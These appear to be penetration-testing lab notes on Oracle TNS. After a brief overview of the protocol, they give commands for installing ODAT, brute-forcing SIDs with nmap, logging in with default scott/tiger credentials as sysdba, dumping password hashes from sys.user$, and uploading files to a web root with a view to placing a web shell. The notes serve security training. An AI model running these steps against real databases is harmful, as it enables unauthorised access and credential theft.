# Oracle Transparent Network Substrate (TNS)

The Oracle Transparent Network Substrate (TNS) is a communication protocol that enables seamless communication between Oracle databases and applications over networks. Initially introduced as part of the Oracle Net Services software suite, TNS supports various networking protocols such as IPX/SPX and TCP/IP.

## Key Features and Usage

- **Protocol Support**: TNS facilitates communication across different networking protocols, ensuring compatibility and flexibility.
- **Industry Application**: Widely used in industries like healthcare, finance, and retail for managing large, complex databases.
- **Data Security**: TNS includes built-in encryption, ensuring secure data transmission, making it ideal for enterprise environments where data security is critical.

TNS has become a preferred solution for its robust features and secure communication capabilities.

#### Oracle-Tools-setup.sh
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```
#### Testing ODAT
```shell-session
$ ./odat.py -h
```

#### Nmap
```shell-session
$ sudo nmap -p1521 -sV 10.129.204.235 --open
```

#### Nmap - SID Bruteforcing
```shell-session
$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

#### ODAT
We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the `all` option and try all modules of the `odat.py` tool.
```shell-session
./odat.py all -s 10.129.204.235
```

#### SQLplus - Log In

```shell-session
$ sqlplus scott/tiger@10.129.204.235/XE
```
If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`
```shell-session
$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

#### Oracle RDBMS - Interaction
```shell-session
select table_name from all_tables;
```
```shell-session
select * from user_role_privs;
```

#### Oracle RDBMS - Database Enumeration
```shell-session
$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
```
#### Oracle RDBMS - Extract Password Hashes
```shell-session
select name, password from sys.user$;
```

Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.
```shell-session
$ echo "Oracle File Upload Test" > testing.txt
```
```shell-session
$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
```shell-session
$ curl -X GET http://10.129.204.235/testing.txt
```